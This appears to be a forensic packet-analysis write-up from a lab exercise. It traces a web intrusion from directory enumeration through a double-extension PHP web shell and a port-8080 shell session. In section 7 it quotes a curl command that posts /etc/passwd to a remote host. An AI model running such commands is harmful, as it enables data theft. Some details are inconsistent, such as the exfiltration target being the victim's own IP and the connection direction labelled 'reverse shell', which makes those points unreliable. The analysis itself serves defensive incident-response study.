# Packet Analysis

### Overview

Packet analysis was performed using **Wireshark** to reconstruct the attacker's activities against the target web server. Examination of HTTP requests, TCP streams, and packet conversations revealed the complete intrusion lifecycle, beginning with reconnaissance, followed by exploitation of a vulnerable upload directory, establishment of a reverse shell, post-exploitation reconnaissance, and attempted data exfiltration.

The primary communicating hosts identified during the investigation were:

| IP Address        | Role              |
| ----------------- | ----------------- |
| **117.11.88.124** | Target web server |
| **24.49.63.79**   | External attacker |

***

## 1. Initial Web Enumeration

The attacker began by enumerating publicly accessible directories and resources hosted on the web server.

Observed requests included:

```
GET /GET /products/GET /about/GET /reviews/GET /admin/GET /uploads/GET /admin/uploadsGET /reviews/uploads
```

These requests indicate systematic reconnaissance aimed at identifying administrative panels, upload locations, and publicly accessible resources that could be exploited.

#### Evidence

```
GET /admin/GET /uploadsGET /reviews/uploads
```

***

## 2. Directory and File Discovery

After locating accessible directories, the attacker browsed several files within the web server.

Examples include:

```
GET /icons/blank.gifGET /icons/back.gifGET /icons/image2.gif
```

These image requests were legitimate server resources used while browsing directory listings.

Although the GIF files themselves were benign, they confirmed that directory indexing or resource enumeration was possible, allowing the attacker to understand the web server structure.

***

## 3. Discovery of Upload Directory

Further enumeration revealed an upload directory:

```
/reviews/uploads/
```

The attacker repeatedly accessed this location before eventually requesting:

```
GET /reviews/uploads/image.jpg.php
```

This request confirmed that a PHP file had been uploaded into the web-accessible directory.

Because the file possessed a **double extension (`image.jpg.php`)**, it was likely intended to bypass file upload validation while remaining executable by the web server.

***

## 4. Web Shell Execution

The request

```
GET /reviews/uploads/image.jpg.php
```

was followed by unusual TCP activity that differed significantly from normal HTTP browsing.

Immediately after the PHP file was executed, a new TCP connection was initiated.

This strongly indicates successful execution of the uploaded web shell.

***

## 5. Reverse Shell Establishment

Conversation statistics revealed communication between

```
24.49.63.79↓117.11.88.124:8080
```

Unlike normal HTTP traffic over port 80, this communication occurred over **TCP port 8080**, a non-standard channel that carried an interactive shell session.

The TCP stream showed:

* TCP three-way handshake
* Persistent ACK packets
* Continuous PSH/ACK packets
* Interactive bidirectional communication

These characteristics are consistent with a reverse shell.

***

## 6. Interactive Command Execution

Following establishment of the reverse shell, the attacker executed multiple reconnaissance commands on the compromised Linux host.

Recovered commands included:

```
whoamiuname -apwdls /homecat /etc/passwd
```

The corresponding output revealed:

```
User:www-data
```

Operating system:

```
Ubuntu Linux
```

Working directory:

```
/var/www/html/reviews/uploads
```

The attacker also enumerated system users by reading:

```
/etc/passwd
```

This activity demonstrates successful post-exploitation discovery of system information.

***

## 7. Attempted Data Exfiltration

Evidence of attempted exfiltration was identified when the attacker issued:

```
curl -X POST -d /etc/passwd http://117.11.88.124:443/
```

Although the capture contained missing packets, the command clearly demonstrates an attempt to transmit sensitive system information using an HTTP POST request.

This represents the collection and attempted exfiltration phase of the intrusion.

***

## 8. Conversation Analysis

Conversation statistics identified two primary communication channels.

| Port | Purpose       | Observation                                                |
| ---- | ------------- | ---------------------------------------------------------- |
| 80   | HTTP          | Reconnaissance, directory enumeration, web shell execution |
| 8080 | Reverse Shell | Interactive attacker command session                       |

The HTTP traffic was short-lived and request-based, whereas the TCP 8080 session remained persistent with hundreds of small interactive packets, indicating continuous command execution.

***

## 9. Traffic Filtering

To isolate attacker-originated traffic, the following Wireshark display filter was applied:

```
ip.src == 24.49.63.79 && ip.dst == 117.11.88.124
```

This filter displays only packets sent **from the attacker** to the compromised server.

Using this filter eliminated background traffic and allowed the investigation to focus exclusively on malicious communications, including:

* Reverse shell traffic
* Command execution
* Interactive TCP session
* Data transmission attempts

***

## Key Findings

| Observation                 | Evidence                                    |
| --------------------------- | ------------------------------------------- |
| Directory enumeration       | `/admin`, `/uploads`, `/reviews/uploads`    |
| Upload directory discovered | `/reviews/uploads/`                         |
| Malicious PHP file executed | `image.jpg.php`                             |
| Reverse shell established   | TCP Port 8080                               |
| Commands executed           | `whoami`, `uname`, `pwd`, `cat /etc/passwd` |
| Privilege level             | `www-data`                                  |
| Data collected              | Linux user database (`/etc/passwd`)         |
| Attempted exfiltration      | HTTP POST using `curl`                      |

***

## Conclusion

Packet analysis confirmed that the attacker successfully progressed through every major stage of the intrusion. Network evidence demonstrated reconnaissance of the web application, discovery of a vulnerable upload directory, execution of a malicious PHP web shell, establishment of an interactive reverse shell over TCP port **8080**, execution of system reconnaissance commands under the **www-data** account, and an attempted exfiltration of sensitive system information. The captured packets provide clear forensic evidence supporting the reconstructed attack timeline and subsequent incident assessment.
